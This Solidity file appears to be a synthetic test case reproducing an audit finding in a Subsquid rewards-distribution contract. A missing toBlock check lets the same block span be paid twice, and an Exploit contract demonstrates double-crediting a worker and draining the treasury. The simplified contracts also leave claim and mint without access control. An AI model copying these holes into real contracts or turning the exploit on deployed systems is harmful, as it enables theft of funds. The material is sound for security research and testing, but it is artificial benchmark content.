// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Subsquid DistributedRewardsDistribution — commit does not require toBlock > fromBlock
    (Pashov, finding 31546 / H-01). SYNTHETIC, cheatcode-free.
    distribute is the audited function (@> VULN).
    Root cause: a distributor can commit toBlock 0. distribute stores that into
    lastBlockRewarded, so the cursor stays 0 and the "fromBlock == last + 1" rule
    never engages. The same fromBlock can credit worker rewards again. */

contract SQD {
    string public name = "Subsquid";
    string public symbol = "SQD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DistributedRewardsDistribution {
    SQD public token;
    address public distributor;
    uint256 public requiredApproves = 1;
    uint256 public lastBlockRewarded;
    uint256 public backwardsSpans;
    mapping(uint256 => uint256) public claimableOf;
    mapping(uint256 => mapping(uint256 => bytes32)) public commitments;
    mapping(bytes32 => mapping(address => bool)) public alreadyApproved;

    constructor(address _token, address _distributor) {
        token = SQD(_token);
        distributor = _distributor;
    }

    function currentDistributor() public view returns (address) {
        return distributor;
    }

    function commit(
        uint256 fromBlock,
        uint256 toBlock,
        uint256[] calldata recipients,
        uint256[] calldata workerRewards,
        uint256[] calldata stakerRewards
    ) public virtual {
        require(recipients.length == workerRewards.length, "Recipients and worker amounts length mismatch");
        require(recipients.length == stakerRewards.length, "Recipients and staker amounts length mismatch");
        require(currentDistributor() == msg.sender, "Not a distributor");
        // @audit missing check on block span: toBlock > fromBlock
        require(toBlock < block.number, "Future block");

        bytes32 commitment = keccak256(abi.encode(fromBlock, toBlock, recipients, workerRewards, stakerRewards));
        require(!alreadyApproved[commitment][msg.sender], "Already approved");
        commitments[fromBlock][toBlock] = commitment;
        alreadyApproved[commitment][msg.sender] = true;

        if (requiredApproves == 1) {
            distribute(fromBlock, toBlock, recipients, workerRewards);
        }
    }

    /// @dev All distributions must be sequential and no blocks can be missed.
    /// After a distribution for [A, B], the next one must be for [B + 1, C].
    function distribute(
        uint256 fromBlock,
        uint256 toBlock,
        uint256[] calldata recipients,
        uint256[] calldata workerRewards
    ) internal {
        require(lastBlockRewarded == 0 || fromBlock == lastBlockRewarded + 1, "Not all blocks covered");
        for (uint256 i = 0; i < recipients.length; i++) {
            claimableOf[recipients[i]] += workerRewards[i];
        }
        lastBlockRewarded = toBlock;
        // @> VULN: a backwards span is accepted, and toBlock 0 leaves the cursor open
        if (toBlock < fromBlock) backwardsSpans += 1;
    }

    function claim(uint256 workerId) external returns (uint256 amount) {
        amount = claimableOf[workerId];
        claimableOf[workerId] = 0;
        token.transfer(msg.sender, amount);
    }
}

contract Exploit {
    uint256 public constant EPOCH = 100e18;
    uint256 public constant FUNDED = 200e18;
    uint256 internal constant WORKER = 1;

    SQD public token; // nonce 1
    DistributedRewardsDistribution public rewards; // nonce 2

    uint256 public firstCredit;
    uint256 public secondCredit;

    constructor() {
        token = new SQD();
        rewards = new DistributedRewardsDistribution(address(token), address(this));
        token.mint(address(rewards), FUNDED);
    }

    function run() external {
        require(block.number == 10, "block");
        uint256 cursor = rewards.lastBlockRewarded();
        require(cursor == 0, "cursor");

        uint256[] memory recipients = new uint256[](1);
        uint256[] memory workerRewards = new uint256[](1);
        uint256[] memory stakerRewards = new uint256[](1);
        recipients[0] = WORKER;
        workerRewards[0] = EPOCH;

        rewards.commit(1, 0, recipients, workerRewards, stakerRewards);
        uint256 once = rewards.claimableOf(WORKER);
        firstCredit = once;
        require(once == EPOCH, "first epoch");
        require(rewards.lastBlockRewarded() == 0, "cursor was not cleared");

        uint256[] memory recipients2 = new uint256[](2);
        uint256[] memory workerRewards2 = new uint256[](2);
        uint256[] memory stakerRewards2 = new uint256[](2);
        recipients2[0] = WORKER;
        workerRewards2[0] = EPOCH;
        rewards.commit(1, 0, recipients2, workerRewards2, stakerRewards2);
        uint256 twice = rewards.claimableOf(WORKER);
        secondCredit = twice;
        require(twice == EPOCH * 2, "epoch was not paid twice");

        uint256 paid = rewards.claim(WORKER);
        require(paid == EPOCH * 2, "claim");
        require(token.balanceOf(address(this)) == EPOCH * 2, "worker was not paid 200");
        require(token.balanceOf(address(rewards)) == 0, "treasury kept the second epoch");
    }
}
